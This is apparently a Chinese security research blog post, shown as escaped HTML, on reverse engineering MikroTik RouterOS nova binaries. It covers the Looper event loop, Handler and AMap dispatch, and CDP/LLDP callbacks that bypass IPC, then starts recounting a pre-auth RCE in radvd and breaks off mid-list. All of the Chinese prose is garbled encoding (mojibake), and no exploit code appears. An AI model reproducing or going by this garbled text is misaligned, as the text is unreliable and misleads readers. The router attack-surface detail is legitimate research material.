&lt;p&gt;ÁÑ∂ËÄåÂú®ÈÄÜÂêë RouterOS ‰∏äÁöÑ binary ‰∏ÄÊÆµÊôÇÈñì‰πãÂæåÔºåÊàëÂÄëÁôºÁèæÊï¥ÂÄãÁ≥ªÁµ±ÁöÑË§áÈõúÂ∫¶‰∏çÂÉÖÊñºÊ≠§Ôºå‰ΩÜÂçªÊ≤í‰ªÄÈ∫º‰∫∫ÊèêÂèäÁõ∏ÈóúÁ¥∞ÁØÄ„ÄÇÂõ†Ê≠§Êúâ‰∫Ü‰ª•‰∏ãÁöÑÊÑüÊÉ≥Ôºö„ÄåÊ≤íÊúâ‰ªª‰ΩïÁêÜÊô∫Ê≠£Â∏∏ÁöÑ‰∫∫ÊÉ≥Ë¶ÅËä±ÊôÇÈñìÈÄÜÂêë nova binary„Äç„ÄÇ&lt;/p&gt;

&lt;p&gt;Èô§‰∫ÜÂæû CIA Âèä APT ÂèñÂæóÁöÑ exploit ‰πãÂ§ñÔºåÂ§ßÈÉ®ÂàÜÂú® RouterOS ‰∏äÂ∞ãÊâæÊºèÊ¥ûÁöÑÁ†îÁ©∂‰∏çÂ§ñ‰πéÊòØ Fuzzing Á∂≤Ë∑ØÂçîË≠∞„ÄÅÁé©ÂºÑ nova message ÊàñÊòØÈáùÂ∞ç nova message ÈÄ≤Ë°åÊ®°Á≥äÊ∏¨Ë©¶„ÄÇÂæûÊàêÊûú‰æÜÁúãÔºåÊîªÊìäËÄÖÂ∞çÊñº RouterOS ÁöÑÁêÜËß£‰ºº‰πéÈ´òÈÅéÊàëÂÄëÂæàÂ§öÔºåÊàëÂÄëÈúÄË¶ÅÊé¢Á¥¢Êõ¥Â§öÈóúÊñº nova binary ÁöÑÁ¥∞ÁØÄ‰æÜÂΩåË£úÂ∑ÆË∑ùÔºåÊâçÊúâÊ©üÊúÉÊâæÂà∞ÊàëÂÄëÊÉ≥Ë¶ÅÊâæÁöÑÊºèÊ¥û„ÄÇÈõñÁÑ∂ÊàëÂÄë‰∏¶‰∏çÂèçÂ∞ç fuzzing ÈÄôÂÄãÊâãÊ≥ïÔºå‰ΩÜËã•Ë¶ÅÂú®ÈÄôÂ†¥ÊØîË≥Ω‰∏≠ÂèñÂæóÂÑ™Âã¢ÔºåÊàëÂÄëÂ∞±ÂøÖÈ†àÁ¢∫ÂÆöÊâÄÊúâÁ¥∞ÁØÄÈÉΩË¢´Ë¶™ÁúºÁúãÈÅé„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;Âæû‰ΩïÈñãÂßã&quot;&gt;Âæû‰ΩïÈñãÂßã&lt;/h2&gt;

&lt;p&gt;ÊàëÂÄë‰∏çË™çÁÇ∫ RouterOS Â∑≤Á∂ìÂÆåÁæéÁÑ°ÊöáÔºåËÄå‰∏î‰∏çÈõ£ÁôºÁèæÁ†îÁ©∂Âì°ËàáÊîªÊìäËÄÖÂ∞çÊñº RouterOS ÁöÑÁêÜËß£Â≠òÂú®ËëóÂ∑ÆË∑ù„ÄÇÊâÄ‰ª•ÔºåË¶ÅÂú® RouterOS ‰∏äÊâæÂà∞ pre-auth RCE ÊàëÂÄëÈÇÑÁº∫Â∞ë‰ªÄÈ∫ºÔºü&lt;/p&gt;

&lt;p&gt;È¶ñÂÖàÊàëÂÄëÊÉ≥Âà∞ÁöÑÁ¨¨‰∏ÄÂÄãÂïèÈ°åÊòØÔºöIPC ÁöÑÂÖ•Âè£ÈªûÂú®Âì™Ë£°ÔºåÂÆÉÂèàÈÄöÂæÄÂì™Ë£°ÔºüÂ§ßÈÉ®ÂàÜÈÄèÈÅé IPC Ëß∏ÁôºÁöÑÂäüËÉΩÈÉΩÈúÄË¶ÅÈÄ≤Ë°åÁôªÂÖ•ÔºåÊâÄ‰ª•ÂèØ‰ª•È†êÊúüÂà∞ÔºöÊãòÊ≥•Êñº IPCÔºåÂè™ÊúÉÊâæÂà∞Êõ¥Â§ö post-auth ÁöÑÂº±Èªû„ÄÇ‰∏î IPC ‰∏çÈÅéÂè™ÊòØ RouterOS ‰∏äÁî®‰æÜÂØ¶‰Ωú‰∏ªË¶ÅÂäüËÉΩÁöÑÂÖ∂‰∏≠‰∏ÄÂÄãÁí∞ÁØÄÔºåÊàëÂÄëÊõ¥ÊÉ≥Áõ¥Êé•„ÄÅË¨πÊÖéÁöÑËßÄÂØüÊØèÂÄãÂäüËÉΩÁöÑÊ†∏ÂøÉÁ®ãÂºèÁ¢º„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëàâ‰æã‰æÜË™™ÔºöË≤†Ë≤¨ËôïÁêÜ DHCP ÁöÑ process ÊòØÂ¶Ç‰ΩïÂæû‰∏ÄÂÄã DHCP Â∞ÅÂåÖ‰∏≠Êì∑ÂèñÈúÄË¶ÅÁöÑË≥áË®äÔºüÈÄô‰∫õË≥áË®äÂèØËÉΩÁõ¥Êé•Ë¢´Â≠òÂú®Ë©≤ process ‰∏≠ÔºåÊàñÂèØËÉΩÈúÄË¶ÅÈÄèÈÅé IPC ÈÄÅÁµ¶ÂÖ∂‰ªñ process ÂÅöÈÄ≤‰∏ÄÊ≠•ËôïÁêÜ„ÄÇ
&lt;img src=&quot;/assets/img/blog/20240524/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;nova-binary-ÁöÑÊû∂Êßã&quot;&gt;Nova Binary ÁöÑÊû∂Êßã&lt;/h3&gt;

&lt;p&gt;Âõ†Ê≠§ÊàëÂÄëÂøÖÈ†àÂÖàË™çË≠ò nova binary ÁöÑÊû∂ÊßãÔºåÊØèÂÄã nova binary ‰∏≠ÈÉΩÊúâ‰∏ÄÂÄã LooperÔºàÊàñÂÖ∂Ë°çÁîüÈ°ûÂà•ÔºöMultifiberLooperÔºâÔºåLooper ÊòØË≤†Ë≤¨Âü∑Ë°å event loop ÈÇèËºØÁöÑ‰∏ÄÂÄãÈ°ûÂà•ÔºåÊØèÊ¨°Ëø≠‰ª£ÈÉΩÊúÉÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runTimer&lt;/code&gt; ‰æÜÂü∑Ë°åÊôÇÈñìÂà∞‰∫ÜÁöÑ timer Ôºå‰ª•ÂèäÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poll&lt;/code&gt; ÂéªÊ™¢Êü• socket ÁöÑÁãÄÊÖã‰∏¶ÂÅöÁõ∏Â∞çÊáâÁöÑËôïÁêÜ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looper ‰πüË≤†Ë≤¨Ëá™Â∑±ÊâÄÂú®ÁöÑ nova binary Ëàá loader ‰πãÈñìÁöÑÊ∫ùÈÄöÔºåLooper È¶ñÂÖàÊúÉÂÖàÊúÉÈáùÂ∞çÁï∂Ââç binary Ëàá loader ‰πãÈñìÁöÑ unix socket Ë®ªÂÜä‰∏ÄÂÄãÁâπÂà•ÁöÑ callback functionÔºö&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onMsgSock&lt;/code&gt;ÔºåÈÄôÂÄãÂáΩÂºèË≤†Ë≤¨ÊääÂæû socket Êî∂Âà∞ÁöÑ nova message ÂàÜÈÖçÁµ¶ nova binary ‰∏≠Â∞çÊáâÁöÑ handler„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;handler-È°ûÂà•ËàáÂÖ∂Ë°çÁîüÈ°û&quot;&gt;Handler È°ûÂà•ËàáÂÖ∂Ë°çÁîüÈ°û&lt;/h3&gt;

&lt;p&gt;Áï∂ Looper Êî∂Âà∞‰∏ÄÂÄã nova message ÊôÇÔºåÂÆÉÊúÉÂ∞á‰πãÂàÜÊ¥æÁµ¶Â∞çÊáâÁöÑ handler„ÄÇ‰æãÂ¶ÇÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; ÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[14, 0]&lt;/code&gt; ÁöÑË®äÊÅØÊúÉË¢´ loader ÂàÜÈÖçÁµ¶ binary id ÁÇ∫ 14 ÁöÑ nova binaryÔºåËÄå binary id ÁÇ∫ 14 ÁöÑ binary ‰∏≠ÁöÑ looper Êî∂Âà∞ÊôÇÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; Â∑≤Á∂ìÂâ©‰∏ã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[0]&lt;/code&gt;ÔºåÂõ†Ê≠§ looper ÊúÉÂ∞áÂÖ∂ÂàÜÈÖçÁµ¶ handler 0 ÈÄ≤Ë°åËôïÁêÜ„ÄÇÂ¶ÇÊûú‰∏ÄÈñãÂßãÁöÑ nova message ‰∏≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; ÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[14]&lt;/code&gt;ÔºåÂâá looper Êî∂Âà∞ÊôÇ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; ÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[]&lt;/code&gt;ÔºåÈÄôÁ®ÆÊÉÖÂ¢ÉÂ∞áÁî± Looper Ëá™Ë°åËôïÁêÜ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÁèæÂú®ËÆìÊàëÂÄëÂÅáË®≠ÔºåLooper Êî∂Âà∞‰∫Ü‰∏ÄÂÄãÁî± handler 1 Ë≤†Ë≤¨ÁöÑ nova messageÔºå‰∏¶ÂàÜÈÖçÁµ¶ handler 1ÔºåÂú®Êî∂Âà∞ message ÂæåÔºåhandler 1 ÊúÉÂéªÂëºÂè´ Handler È°ûÂà•‰∏≠ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::Handler::handleCmd&lt;/code&gt;ÔºåÈÄôÂÄãÂáΩÂºèÊúÉÊ†πÊìö nova message ‰∏≠ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_CMD&lt;/code&gt; Âú® vtable ‰∏≠Â∞ãÊâæÂ∞çÊáâÁöÑ function Âü∑Ë°å„ÄÇ&lt;/p&gt;

&lt;p&gt;Èô§‰∫ÜÂ∏∏Ë¶èÁöÑÂäüËÉΩ‰πãÂ§ñÔºåvtable ‰∏≠ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdUnknown&lt;/code&gt; Â∏∏Ë¢´ÈñãÁôºËÄÖ override Áî®‰ª•Êì¥ÂÖÖÂäüËÉΩÔºå‰ΩÜÊúâÊôÇÈñãÁôºËÄÖÂèçËÄåÊòØ override &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handleCmd&lt;/code&gt;ÔºåÁúãËµ∑‰æÜÊòØÂÖ®‰æù MikroTik ÈñãÁôºËÄÖÁöÑÂøÉÊÉÖËÄåÂÆö„ÄÇËÄå Handler È°ûÂà•Âõ†ÁÇ∫ÊòØÂü∫Á§éÈ°ûÂà•ÔºåÊâÄ‰ª• object Áõ∏ÈóúÁöÑÊåá‰ª§‰∏¶Ê≤íÊúâË¢´ÂØ¶‰Ωú„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;Ë°çÁîüÈ°ûÂà•&quot;&gt;Ë°çÁîüÈ°ûÂà•&lt;/h3&gt;

&lt;p&gt;ÁÑ∂ËÄå nova binary ‰∏≠‰ΩøÁî®ÊúÄÂ§öÁöÑ‰∏¶‰∏çÊòØÂü∫Êú¨ÁöÑ Handler È°ûÂà•ÔºåËÄåÊòØÂÖ∂Ë°çÁîüÈ°ûÂà•„ÄÇ Ë°çÁîüÈ°ûÂà•ÂèØ‰ª•Áî®‰æÜÂÑ≤Â≠òÂ§öÂÄãÂñÆ‰∏ÄÂûãÂà•Áâ©‰ª∂ÔºåÈ°û‰ºº C++ ÁöÑ STL ÂÆπÂô®„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëàâ‰æã‰æÜË™™ÔºåÁï∂‰ΩøÁî®ËÄÖÈÄèÈÅé web panel ÁöÑÁÆ°ÁêÜ‰ªãÈù¢Âª∫Á´ã‰∏ÄÂÄã DHCP server ÁöÑÊôÇÂÄôÔºåÊúÉÈÄÅÂá∫‰∏ÄÂÄãÊåá‰ª§ÁÇ∫„Äåadd object„ÄçÁöÑ nova message Âà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; process ÁöÑ handler 0ÔºåÊé•‰∏ã‰æÜ handler 0 ÊúÉÁî¢Áîü‰∏ÄÂÄã dhcp server Áâ©‰ª∂Ë®òÈåÑÁõ∏ÈóúË®≠ÂÆöÔºå‰∏¶‰∏îË©≤Áâ©‰ª∂ÊúÉË¢´‰øùÂ≠òÂú® handler 0 ÂÖßÈÉ®ÁöÑ‰∏ÄÂÄã tree Áï∂‰∏≠„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôË£°ÁöÑ handler 0 Â∞±ÊòØ‰∏ÄÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt; ÁöÑ instanceÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt; Âç≥ÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Handler&lt;/code&gt; ÁöÑ‰∏ÄÂÄãË°çÁîüÈ°ûÂà•„ÄÇ ‰∏îÁî±ÊñºÊåá‰ª§ÊòØ„Äåadd object„ÄçÔºåÊâÄ‰ª•Ëß∏Áôº‰∫Ü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap::cmdAddObj&lt;/code&gt; ÈÄôÂÄãÊàêÂì°ÂáΩÂºèÔºåÈÄôÂÄãÊàêÂì°ÂáΩÂºèÊúÉÂéªÂëºÂè´ handler 0 ÁöÑ vtable ‰∏≠‰ΩçÊñº offset 0x7c ‰ΩçÁΩÆÊâÄÊåáÂêëÁöÑ‰∏ÄÂÄã functionÔºåÈÄôÂÄã function ÂØ¶Èöõ‰∏äÂ∞±ÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt; ‰∏≠ÂåÖÂê´ÁöÑÁâ©‰ª∂ÁöÑÂª∫ÊßãÂºèÔºå‰æãÂ¶ÇÔºåËã•ÈñãÁôºËÄÖÂú®ÂÆ£Âëä handler 0 ÊôÇÔºåÂÖ∂È°ûÂûãÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&amp;lt;string&amp;gt;&lt;/code&gt; ÔºåÂâá offset 0x7c ÁöÑ‰ΩçÁΩÆÊâÄÊåáÂêëÁöÑ function Â∞±ÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string&lt;/code&gt; ÁöÑÂª∫ÊßãÂºè„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊØèÂÄãË°çÁîüÈ°ûÂà•ÂÑ≤Â≠òÂÖßÈÉ®Áâ©‰ª∂Âª∫ÊßãÂºèÁöÑ function Âú® vtable ‰∏äÁöÑ offset ÈÉΩ‰∏çÁõ∏ÂêåÔºåÊÉ≥Ë¶ÅÊâæÂà∞Ë°çÁîüÈ°ûÂà•‰∏≠Áâ©‰ª∂ÁöÑÂª∫ÊßãÂ≠êÔºåÂèØ‰ª•ÈÄèÈÅéÈÄÜÂêëÂÆÉÂÄëÂÄãÂà•ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdAddObj&lt;/code&gt; ‰æÜÊâæÂà∞„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ipcÂíå-ipc-‰ª•Â§ñÁöÑ&quot;&gt;IPCÔºåÂíå IPC ‰ª•Â§ñÁöÑ&lt;/h3&gt;

&lt;p&gt;ÂÑòÁÆ° IPC ‰ºº‰πéÁÑ°Ëôï‰∏çÂú®Ôºå‰ΩÜÂÖ∂ÂØ¶ RouterOS ‰∏≠ÊúâË®±Â§öÂäüËÉΩ‰∏¶‰∏ç‰ª• IPC ÂØ¶Áèæ„ÄÇ‰ª•ÂØ¶‰ΩúÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;discover&lt;/code&gt; Á®ãÂºè‰∏≠ÁöÑÂÖ©ÂÄã layer 2 ÁöÑÁôºÁèæÂçîË≠∞ÔºöCDP„ÄÅLLDP ÁÇ∫‰æãÔºö&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Âú®ÈñãÂïüÈÄôÂÖ©ÂÄãÊúçÂãôÊôÇÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;discover&lt;/code&gt; ‰∏≠ÁöÑ handler 0 ÊúÉË≤†Ë≤¨ÂéªÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::createPacketReceiver&lt;/code&gt; ‰æÜÈñãÂïü CDP Âèä LLDP ‰ΩøÁî®ÁöÑ socket ‰∏¶‰∏îË®ªÂÜäÂàÜÂà•Â∞çÊáâÁöÑ callback function&lt;/li&gt;
  &lt;li&gt;Âú® Looper ÁöÑÊØèÊ¨°Ëø≠‰ª£‰∏≠ÔºåÁ®ãÂºèÊúÉÈÄèÈÅé poll ‰æÜÊ™¢Êü• CDP Âèä LLDP socket ÊòØÂê¶ÊúâÊî∂Âà∞Â∞ÅÂåÖ&lt;/li&gt;
  &lt;li&gt;Â¶ÇÊûúÁôºÁèæÊúâÊî∂Âà∞Â∞ÅÂåÖÂ∞±ÊúÉÂëºÂè´Â∞çÊáâÁöÑ callback function ÂéªÈÄ≤Ë°åËôïÁêÜ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;CDP ÁöÑ callback ÂÅöÁöÑ‰∫ãÊÉÖ‰πüÈùûÂ∏∏Á∞°ÂñÆÔºöÁ¢∫ÂÆöÊî∂Âà∞Â∞ÅÂåÖÁöÑ interface ÊòØÂÖÅË®±Â≠òÂèñÁöÑÔºåÂ¶ÇÊûúÊ≠£Á¢∫ÔºåÂ∞±Ëß£ÊûêÂ∞ÅÂåÖ‰∏¶Áõ¥Êé•ÊääË≥áË®äÁõ¥Êé•Â≠òÂÖ• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::ASecMap&lt;/code&gt; Êé•ËëóÂ∞±Áõ¥Êé•ÁµêÊùüÔºåÈÅéÁ®ã‰∏≠‰∏¶‰∏ç‰ΩøÁî® nova message„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®Ê≠§È°ûÊÉÖÂ¢É‰∏≠ÔºåIPC Èô§‰∫ÜÁî®‰æÜÈñãÂïü CDP Êàñ LLDP ÊúçÂãô‰πãÂ§ñÔºàÈ†êË®≠ÈñãÂïüÔºâÔºåÂÆåÂÖ®ÁÑ°Ê≥ïËß∏Áôº CDP ÊàñÊòØ LLDP ÁöÑ‰ªª‰ΩïÂäüËÉΩÔºåÂõ†Ê≠§‰ª•ÂæÄÂ∞àÊ≥®Êñº IPC ÁöÑÁ†îÁ©∂Â∞±ÂæàÊúâÂèØËÉΩÊ≤íÊúâÊ™¢Ê∏¨Âà∞ÈÄôÁ®ÆÂØ¶‰ΩúÊñπÂºèÁöÑÁ®ãÂºèÈÇèËºØ„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;pre-auth-rce-ÁöÑÊïÖ‰∫ã&quot;&gt;Pre-Auth RCE ÁöÑÊïÖ‰∫ã&lt;/h2&gt;

&lt;p&gt;Â∞çÊñº RouterOS ÁöÑÁêÜËß£Ôºå‰πü‰º¥Èö®Ëëó‰∏ÄÊ¨°È©öÂñúÁöÑÊÑèÂ§ñÂ∏∂È†òÊàëÂÄëÊâæÂà∞Ê∑±ËóèÂ∑≤‰πÖÁöÑÊºèÊ¥û„ÄÇ&lt;/p&gt;

&lt;p&gt;Ë≥ΩÂâçÊüê‰∏ÄÂ§©ÔºåÊàëÂÄëÁÖßÂ∏∏ÁÇ∫‰∫ÜÂú® RouterOS ‰∏äÈÄ≤Ë°åÈÄÜÂêëÂèäÈô§ÈåØËÄåÊèíÊãîÁ∂≤Ë∑ØÁ∑öÊôÇÔºåÁôºÁèæ log file Á¥ÄÈåÑÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÈÄôÈöªÁ®ãÂºèÂ∑≤Á∂ì crash ‰∫ÜÂ•ΩÂπæÊ¨°ÔºÅÊâÄ‰ª•ÊàëÂÄëÂòóË©¶ÊèíÊãîÁ∂≤Ë∑ØÁ∑ö‰æÜÊâãÂãïÂæ©Áèæ crash ÁöÑÁôºÁîüÔºåÊê≠ÈÖç debugger ‰ΩøÁî®Â∞±ËÉΩÂÆö‰ΩçÂà∞Âá∫ÂïèÈ°åÁöÑÂú∞ÊñπÔºå‰ΩÜÁ∂ìÈÅé‰∫Ü‰∏äÂçÉÊ¨°ÁöÑÊèíÊãîÔºåÊàëÂÄëÈÇÑÊòØÁÑ°Ê≥ïÁ¢∫ÂÆö crash Áî¢ÁîüÁöÑÊ¢ù‰ª∂ÔºåÂè™ËÉΩ‰ªªÊÜë crash Èö®Ê©üÁöÑÁôºÁîü„ÄÇ&lt;/p&gt;

&lt;p&gt;Á∂ìÈÅé‰∏ÄÊÆµÊôÇÈñìÁöÑÊéôÊâéÂæåÔºåÊàëÂÄëÂÅúÊ≠¢ÈÄèÈÅéÈÄôÁ®ÆÁõ≤ÁõÆÁöÑÂòóË©¶‰æÜÂÆö‰ΩçÊºèÊ¥ûÔºåËΩâËÄåÂà©Áî®ÈùúÊÖãÈÄÜÂêëÂàÜÊûê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ‰æÜÂ∞ãÊâæ crash Áî¢ÁîüÁöÑ‰ΩçÁΩÆÔºåÈõñÁÑ∂ÊúÄÂæå‰æùËàäÊ≤íÊâæÂà∞ÈÄ†Êàê crash ÁöÑÊ†πÂõ†Ôºå‰ΩÜÂèóÁõäÊñºÊàëÂÄëÂ∞çÊñº nova binary ÁöÑÁêÜËß£ÔºåÊàëÂÄëÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ‰∏≠ÊâæÂà∞‰∫ÜÂè¶Â§ñ‰∏ÄÂÄãÂèØ‰ª•Âà©Áî®ÁöÑÊºèÊ¥û„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú®‰ªãÁ¥πÈÄôÂÄãÊºèÊ¥û‰πãÂâçÔºåÂøÖÈ†àÂæóÂÖà‰ªãÁ¥π‰∏Ä‰∏ã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;  process Á©∂Á´üÊòØË≤†Ë≤¨‰ªÄÈ∫ºÂäüËÉΩÁöÑÁ®ãÂºè„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;slaac-stateless-address-auto-configuration-&quot;&gt;SLAAC (Stateless Address Auto-Configuration )&lt;/h3&gt;

&lt;p&gt;‰∏ÄË®Ä‰ª•ËîΩ‰πãÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÊòØ‰∏ÄÂÄãË≤†Ë≤¨ËôïÁêÜ IPv6 ÁöÑ SLAAC ÁöÑÊúçÂãô„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú® SLAAC Áí∞Â¢É‰∏≠ÔºåÂÅáË®≠‰∏ÄÂè∞ÈõªËÖ¶ÊÉ≥Ë¶ÅÂèñÂæó‰∏ÄÂÄã IPv6 ÁöÑÂú∞ÂùÄ‰∏äÁ∂≤Ôºå‰ªñÈ¶ñÂÖàÊúÉÂêëÊâÄÊúâ router Âª£Êí≠‰∏ÄÂÄã RSÔºàRouter SolicitationÔºâÁöÑË´ãÊ±Ç„ÄÇ Âú® Router Êî∂Âà∞ RS ‰πãÂæåÔºåÂ∞±ÊúÉÈÄèÈÅé RAÔºàRouter AdvertisementÔºâÂ∞á network prefix Âª£Êí≠Âá∫ÂéªÔºõÊî∂Âà∞ RA ÁöÑÈõªËÖ¶‰æøÂèØ‰ª•Êãø network prefix ‰ª•Âèä EUI-64 ‰æÜËá™Ë°åÊ±∫ÂÆöËá™Â∑±Áî®‰æÜÈÄ£Á∂≤ÁöÑ IPv6 ÁÇ∫‰Ωï„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ëã• ISP ÊàñÊòØÁ∂≤ÁÆ°ÔºåÊÉ≥Êää‰∏ÄÂÄãÁ∂≤ÊÆµÂàÜÈÖçÁµ¶Áî®Êà∂ÔºåËÆìÁî®Êà∂ÂèØËá™Ë°åÂàÜÈÖçÂú∞ÂùÄÁµ¶Áî®Êà∂ÁÆ°ÁêÜÁöÑÊ©üÂô®ÔºåÂú®Âè™‰ΩøÁî® SLAAC ËÄå‰∏çËºî‰ª• DHCP ÊôÇÔºåÂ¶Ç‰ΩïÂàÜÈÖç‰∏ÄÂÄãÁ∂≤ÊÆµÁµ¶‰ΩøÁî®ËÄÖÔºüÂõ†ÁÇ∫ SLAAC ‰∏¶Ê≤íÊúâËæ¶Ê≥ïÁõ¥Êé•ÂßîÊ¥æÔºåÊâÄ‰ª•ÈÄöÂ∏∏ÊúÉÊòØÈÄôÈ∫ºÈÅã‰ΩúÁöÑÔºö&lt;/p&gt;

&lt;p&gt;ÂÅáË®≠Êúâ‰∏ÄÂÄã upstream routerÔºöRouter AÔºåÂÆÉÂ±¨Êñº ISP ÊàñÁ∂≤ÁÆ°„ÄÅÈÇÑÊúâ‰∏ÄÂè∞Áî®Êà∂Ëá™Ë°åÁÆ°ÁêÜÁöÑ Router B„ÄÅ‰∏ÄÂè∞Áî®Êà∂ÁÆ°ÁêÜÁöÑÈõªËÖ¶„ÄÇISP ÊàñÁ∂≤ÁÆ°ÊúÉÈ†êÂÖàÈÄèÈÅé email ÈÄöÁü•Áî®Êà∂‰∏ÄÂÄãÂàÜÈÖçÁµ¶Áî®Êà∂‰ΩøÁî®ÁöÑ /48 network preifxÔºåÈÄôË£°ÂÅáË®≠ÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2001:db8::/48&lt;/code&gt;„ÄÇÁî®Êà∂ÂèØ‰ª•Â∞á‰πãË®≠ÂÆöÂú® Router B ‰∏äÔºåÂâáÁï∂ÈõªËÖ¶Âêë Router B ÁôºÈÄÅ RS ÊôÇÔºåRouter B Â∞±ÊúÉÊääÈÄôÂÄã prefix ÊîæÂÖ• RA ‰∏≠ÂõûÂÇ≥ÔºåËÄåÈÄôÂÄã prefix Á®±‰Ωú routed prefix„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÂêåÊôÇÁÇ∫‰∫ÜËÆì‰ΩøÁî®ËÄÖÁöÑ Router B ÊúâËæ¶Ê≥ïËàá Router A Ê∫ùÈÄöÔºåÂÆÉ‰πüÈúÄË¶Å‰∏ÄÂÄãËá™Â∑±ÁöÑ IPv6 Âú∞ÂùÄÔºåÈÄôÊôÇ Router B Âæû Router A ÊãøÂà∞ÁöÑ network prefix Â∞±Á®±‰Ωú link prefix„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;radvd-ÁöÑÂü∑Ë°åÊµÅÁ®ã&quot;&gt;radvd ÁöÑÂü∑Ë°åÊµÅÁ®ã&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; process Ë¢´ÂïüÂãïÊôÇÔºåÊúÉÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::ThinRunner::addSocket&lt;/code&gt; ‰æÜÈñãÂïü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ‰ΩøÁî®ÁöÑ socket ‰∏¶‰∏îË®ªÂÜäÂ∞çÊáâÁöÑ callback function
&lt;img src=&quot;/assets/img/blog/20240524/29.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Âú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Looper&lt;/code&gt; ÁöÑÊØèÊ¨°Ëø≠‰ª£‰∏≠ÊúÉÈÄèÈÅé poll Ê™¢Êü• socket ÊòØÂê¶ÊúâÊî∂Âà∞Â∞ÅÂåÖ
